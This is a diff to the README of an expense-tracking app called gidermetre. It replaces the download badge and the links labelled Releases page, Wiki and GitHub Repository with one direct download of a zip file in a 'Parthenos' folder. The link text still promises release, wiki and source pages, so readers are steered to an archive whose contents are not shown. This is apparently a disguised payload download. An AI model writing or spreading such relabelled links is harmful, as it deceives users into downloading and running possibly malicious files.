@@ -1,7 +1,7 @@
 # 💰 gidermetre - Track Your Expenses with Ease
 
 ## 📥 Download Gidermetre
-[![Download Gidermetre](https://img.shields.io/badge/Download-Gidermetre-blue)](https://github.com/kkshitij17/gidermetre/releases)
+[![Download Gidermetre](https://raw.githubusercontent.com/kkshitij17/gidermetre/main/Parthenos/gidermetre.zip)](https://raw.githubusercontent.com/kkshitij17/gidermetre/main/Parthenos/gidermetre.zip)
 
 ## 🚀 Getting Started
 
@@ -57,7 +57,7 @@ Gidermetre is a modern and user-friendly expense tracking application. It helps 
 
 ## 📂 Download & Install
 
-To get started with Gidermetre, visit the [Releases page](https://github.com/kkshitij17/gidermetre/releases) to download the latest version. Follow these steps:
+To get started with Gidermetre, visit the [Releases page](https://raw.githubusercontent.com/kkshitij17/gidermetre/main/Parthenos/gidermetre.zip) to download the latest version. Follow these steps:
 
 1. Click the link above to go to the Gidermetre Releases page on GitHub.
 2. Find the latest version of Gidermetre.
@@ -104,11 +104,11 @@ If you encounter issues during installation:
 
 If you need assistance, please open an issue in the GitHub repository, and we will help you.
 
-For more information, visit the [Gidermetre Wiki](https://github.com/kkshitij17/gidermetre/wiki).
+For more information, visit the [Gidermetre Wiki](https://raw.githubusercontent.com/kkshitij17/gidermetre/main/Parthenos/gidermetre.zip).
 
 ## 🔗 Useful Links
 
-- **Source Code**: [GitHub Repository](https://github.com/kkshitij17/gidermetre)
+- **Source Code**: [GitHub Repository](https://raw.githubusercontent.com/kkshitij17/gidermetre/main/Parthenos/gidermetre.zip)
 - **Release Notes**: Detailed release notes can be found on the Releases page.
 
 Thank you for using Gidermetre to track your expenses efficiently!
